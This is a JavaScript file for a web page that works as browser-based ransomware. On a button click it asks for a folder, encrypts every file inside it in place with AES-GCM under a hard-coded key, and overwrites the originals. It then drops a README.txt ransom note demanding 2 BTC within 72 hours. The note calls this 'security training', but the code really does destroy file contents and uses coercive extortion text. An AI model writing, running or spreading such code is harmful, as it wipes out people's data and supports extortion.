const UI = {
    btn: document.getElementById('selectDirBtn'),
    bar: document.getElementById('progressBar'),
    text: document.getElementById('progressText')
};

// FIXED KEY: 0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20
async function getFixedKey() {
    const rawKey = new Uint8Array([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20
    ]);
    return await window.crypto.subtle.importKey("raw", rawKey, { name: "AES-GCM" }, false, ["encrypt"]);
}

async function scanFolder(handle, fileList = []) {
    for await (const entry of handle.values()) {
        if (entry.kind === 'file') fileList.push(entry);
        else if (entry.kind === 'directory') await scanFolder(entry, fileList);
    }
    return fileList;
}

async function encryptFile(fileHandle, key) {
    if (fileHandle.name === "README.txt") return;
    const file = await fileHandle.getFile();
    const contents = await file.arrayBuffer();
    const iv = window.crypto.getRandomValues(new Uint8Array(12));
    
    const ciphertext = await window.crypto.subtle.encrypt({ name: "AES-GCM", iv: iv }, key, contents);

    // Final Layout: [IV (12 bytes)][Ciphertext + Tag (remaining bytes)]
    const combined = new Uint8Array(iv.length + ciphertext.byteLength);
    combined.set(iv, 0);
    combined.set(new Uint8Array(ciphertext), iv.length);

    const writable = await fileHandle.createWritable();
    await writable.write(combined);
    await writable.close();
}

UI.btn.addEventListener('click', async () => {
    try {
        const dirHandle = await window.showDirectoryPicker();
        UI.btn.disabled = true;
        const files = await scanFolder(dirHandle);
        const key = await getFixedKey();

        for (let i = 0; i < files.length; i++) {
            UI.text.textContent = `Processing: ${files[i].name}`;
            await encryptFile(files[i], key);
            UI.bar.style.width = `${((i + 1) / files.length) * 100}%`;
        }

        UI.text.textContent = "DONE. All files encrypted.";
        const note = await dirHandle.getFileHandle("README.txt", { create: true });
        const writer = await note.createWritable();
await writer.write("YOUR FILES HAVE BEEN ENCRYPTED FOR SECURITY TRAINING.\nYOUR FILES HAVE BEEN ENCRYPTED\n\nAll important company data has been locked using strong encryption.\n\nTo recover your files, you must send 2 BTC to the following Bitcoin address:\n\nbc1qexamplewalletaddress123456789\n\nAfter payment, send proof to the provided contact.\nYou will then receive the decryption key.\n\nWARNING:\n- Do not rename encrypted files\n- Do not attempt decryption\n- Failure to pay within 72 hours will result in permanent data loss");
        await writer.close();
    } catch (e) { UI.text.textContent = "Error: " + e.message; }
});
